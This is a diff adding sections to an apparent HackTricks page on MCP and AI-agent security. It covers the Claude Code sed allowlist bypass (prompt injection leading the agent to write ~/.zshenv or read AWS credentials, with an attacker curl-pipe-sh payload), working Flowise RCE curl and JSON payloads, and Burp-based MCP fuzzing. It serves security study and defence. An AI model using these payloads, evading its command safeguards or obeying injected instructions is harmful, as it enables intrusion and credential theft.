@@ -153,8 +153,97 @@ The payload can be anything the current OS user can run, e.g. a reverse-shell ba
 * For legacy versions you can detect suspicious diffs with Git hooks or a security agent watching `.cursor/` paths.
 * Consider signing MCP configurations or storing them outside the repository so they cannot be altered by untrusted contributors.
 
+See also – operational abuse and detection of local AI CLI/MCP clients:
+
+{{#ref}}
+../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md
+{{#endref}}
+
+### LLM Agent Command Validation Bypass (Claude Code sed DSL RCE – CVE-2025-64755)
+
+SpecterOps detailed how Claude Code ≤2.0.30 could be driven into arbitrary file write/read through its `BashCommand` tool even when users relied on the built-in allow/deny model to protect them from prompt-injected MCP servers.
+
+#### Reverse‑engineering the protection layers
+- The Node.js CLI ships as an obfuscated `cli.js` that forcibly exits whenever `process.execArgv` contains `--inspect`. Launching it with `node --inspect-brk cli.js`, attaching DevTools, and clearing the flag at runtime via `process.execArgv = []` bypasses the anti-debug gate without touching disk.
+- By tracing the `BashCommand` call stack, researchers hooked the internal validator that takes a fully-rendered command string and returns `Allow/Ask/Deny`. Invoking that function directly inside DevTools turned Claude Code’s own policy engine into a local fuzz harness, removing the need to wait for LLM traces while probing payloads.
+
+#### From regex allowlists to semantic abuse
+- Commands first pass a giant regex allowlist that blocks obvious metacharacters, then a Haiku “policy spec” prompt that extracts the base prefix or flags `command_injection_detected`. Only after those stages does the CLI consult `safeCommandsAndArgs`, which enumerates permitted flags and optional callbacks such as `additionalSEDChecks`.
+- `additionalSEDChecks` tried to detect dangerous sed expressions with simplistic regexes for `w|W`, `r|R`, or `e|E` tokens in formats like `[addr] w filename` or `s/.../../w`. BSD/macOS sed accepts richer syntax (e.g., no whitespace between the command and filename), so the following stay within the allowlist while still manipulating arbitrary paths:
+
+```bash
+echo 'runme' | sed 'w /Users/victim/.zshenv'
+echo echo '123' | sed -n '1,1w/Users/victim/.zshenv'
+echo 1 | sed 'r/Users/victim/.aws/credentials'
+```
+
+- Because the regexes never match these forms, `checkPermissions` returns **Allow** and the LLM executes them without user approval.
+
+#### Impact and delivery vectors
+- Writing to startup files such as `~/.zshenv` yields persistent RCE: the next interactive zsh session executes whatever payload the sed write dropped (e.g., `curl https://attacker/p.sh | sh`).
+- The same bypass reads sensitive files (`~/.aws/credentials`, SSH keys, etc.) and the agent dutifully summarizes or exfiltrates them via later tool calls (WebFetch, MCP resources, etc.).
+- An attacker only needs a prompt-injection sink: a poisoned README, web content fetched through `WebFetch`, or a malicious HTTP-based MCP server can instruct the model to invoke the “legitimate” sed command under the guise of log formatting or bulk editing.
+
+
+### Flowise MCP Workflow RCE (CVE-2025-59528 & CVE-2025-8943)
+
+Flowise embeds MCP tooling inside its low-code LLM orchestrator, but its **CustomMCP** node trusts user-supplied JavaScript/command definitions that are later executed on the Flowise server. Two separate code paths trigger remote command execution:
+
+- `mcpServerConfig` strings are parsed by `convertToValidJSONString()` using `Function('return ' + input)()` with no sandboxing, so any `process.mainModule.require('child_process')` payload executes immediately (CVE-2025-59528 / GHSA-3gcm-f6qx-ff7p). The vulnerable parser is reachable via the unauthenticated (in default installs) endpoint `/api/v1/node-load-method/customMCP`.
+- Even when JSON is supplied instead of a string, Flowise simply forwards the attacker-controlled `command`/`args` into the helper that launches local MCP binaries. Without RBAC or default credentials, the server happily runs arbitrary binaries (CVE-2025-8943 / GHSA-2vv2-3x8x-4gv7).
+
+Metasploit now ships two HTTP exploit modules (`multi/http/flowise_custommcp_rce` and `multi/http/flowise_js_rce`) that automate both paths, optionally authenticating with Flowise API credentials before staging payloads for LLM infrastructure takeover.
+
+Typical exploitation is a single HTTP request. The JavaScript injection vector can be demonstrated with the same cURL payload Rapid7 weaponised:
+
+```bash
+curl -X POST http://flowise.local:3000/api/v1/node-load-method/customMCP \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <API_TOKEN>" \
+  -d '{
+    "loadMethod": "listActions",
+    "inputs": {
+      "mcpServerConfig": "({trigger:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"sh -c \\\"id>/tmp/pwn\\\"\");return 1;})()})"
+    }
+  }'
+```
+
+Because the payload is executed inside Node.js, functions such as `process.env`, `require('fs')`, or `globalThis.fetch` are instantly available, so it is trivial to dump stored LLM API keys or pivot deeper into the internal network.
+
+The command-template variant exercised by JFrog (CVE-2025-8943) does not even need to abuse JavaScript. Any unauthenticated user can force Flowise to spawn an OS command:
+
+```json
+{
+  "inputs": {
+    "mcpServerConfig": {
+      "command": "touch",
+      "args": ["/tmp/yofitofi"]
+    }
+  },
+  "loadMethod": "listActions"
+}
+```
+
+### MCP server pentesting with Burp (MCP-ASD)
+
+The **MCP Attack Surface Detector (MCP-ASD)** Burp extension turns exposed MCP servers into standard Burp targets, solving the SSE/WebSocket async transport mismatch:
+
+- **Discovery**: optional passive heuristics (common headers/endpoints) plus opt-in light active probes (few `GET` requests to common MCP paths) to flag internet-facing MCP servers seen in Proxy traffic.
+- **Transport bridging**: MCP-ASD spins up an **internal synchronous bridge** inside Burp Proxy. Requests sent from **Repeater/Intruder** are rewritten to the bridge, which forwards them to the real SSE or WebSocket endpoint, tracks streaming responses, correlates with request GUIDs, and returns the matched payload as a normal HTTP response.
+- **Auth handling**: connection profiles inject bearer tokens, custom headers/params, or **mTLS client certs** before forwarding, removing the need to hand-edit auth per replay.
+- **Endpoint selection**: auto-detects SSE vs WebSocket endpoints and lets you override manually (SSE is often unauthenticated while WebSockets commonly require auth).
+- **Primitive enumeration**: once connected, the extension lists MCP primitives (**Resources**, **Tools**, **Prompts**) plus server metadata. Selecting one generates a prototype call that can be sent straight to Repeater/Intruder for mutation/fuzzing—prioritise **Tools** because they execute actions.
+
+This workflow makes MCP endpoints fuzzable with standard Burp tooling despite their streaming protocol.
+
 ## References
 - [CVE-2025-54136 – MCPoison Cursor IDE persistent RCE](https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/)
+- [Metasploit Wrap-Up 11/28/2025 – new Flowise custom MCP & JS injection exploits](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-11-28-2025)
+- [GHSA-3gcm-f6qx-ff7p / CVE-2025-59528 – Flowise CustomMCP JavaScript code injection](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
+- [GHSA-2vv2-3x8x-4gv7 / CVE-2025-8943 – Flowise custom MCP command execution](https://github.com/advisories/GHSA-2vv2-3x8x-4gv7)
+- [JFrog – Flowise OS command remote code execution (JFSA-2025-001380578)](https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578)
+- [An Evening with Claude (Code): sed-Based Command Safety Bypass in Claude Code](https://specterops.io/blog/2025/11/21/an-evening-with-claude-code/)
+- [MCP in Burp Suite: From Enumeration to Targeted Exploitation](https://trustedsec.com/blog/mcp-in-burp-suite-from-enumeration-to-targeted-exploitation)
+- [MCP Attack Surface Detector (MCP-ASD) extension](https://github.com/hoodoer/MCP-ASD)
 
 {{#include ../banners/hacktricks-training.md}}
-
